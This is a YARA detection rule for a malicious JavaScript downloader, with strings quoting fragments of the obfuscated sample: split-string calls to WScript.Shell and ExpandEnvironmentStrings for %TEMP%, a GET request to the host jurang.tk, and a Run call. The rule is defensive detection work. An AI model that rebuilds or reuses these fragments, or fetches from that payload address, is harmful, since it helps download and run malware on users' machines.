rule sig_20160427_9dfd2aa101ca19bd4db439c4e8ac2890 {
  meta:
    description = "datamaliciousorder - file 20160427_9dfd2aa101ca19bd4db439c4e8ac2890.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "40ea21b1c22771e16b8c2c8599c4e15bf6a43fff766de9038be8a7bc0d94a89c"

  strings:
    $s1  = "function YbmyuDgknz() {return ZjtsiJplkq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"q1ypw1i" ascii
    $s2  = "function YbmyuDgknz() {return ZjtsiJplkq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"q1ypw1i" ascii
    $s3  = "function FoznqFkdln(RjdgyEmgur, XppsvRtpnx){TxdosQksfg = TxdosQksfg * 1; return RjdgyEmgur - XppsvRtpnx;};" fullword ascii
    $s4  = "var ZjtsiJplkq = function TgapeBoksc() {return BmifjZcwmr[KmrdkHilur](\"WScript\"+\".Shell\");}(), RmmfrTlmcu = 11;" fullword ascii
    $s5  = "RzvdsFpljo[AryetPruks](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var BmifjZcwmr = this[\"WScript\"];" fullword ascii
    $s7  = "if (RzvdsFpljo[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function WsrnvCmudj(){return IlzuoYfsii + \"\";};" fullword ascii
    $s9  = "function WbsgcDetgf() {return ((TscsrQiivq == true) && (TscsrQiivq == JutqjBlvow)) ? 1 : TxdosQksfg;};" fullword ascii
    $s10 = "function LaokiStcdq(VoczwAjaxx) {var CeeokSudeh = (1, 2, 3, 4, 5, VoczwAjaxx); return CeeokSudeh;};" fullword ascii
    $s11 = "EegtwZfmmn = true;" fullword ascii
    $s12 = "TscsrQiivq = true; " fullword ascii
    $s13 = "var OeogcZsmzz = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var JutqjBlvow = false;" fullword ascii
    $s15 = "}while (RtcxxNnuzm);" fullword ascii
    $s16 = "function HtdelJsogv(){return KmrdkHilur;};" fullword ascii
    $s17 = "function AnupcOjsvj(QekwxHwfja){ZjtsiJplkq[\"R\"+\"un\"](QekwxHwfja, TxdosQksfg, TxdosQksfg);};" fullword ascii
    $s18 = "var EegtwZfmmn = false;" fullword ascii
    $s19 = "JutqjBlvow = true; " fullword ascii
    $s20 = "function HmfpsYdowk(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}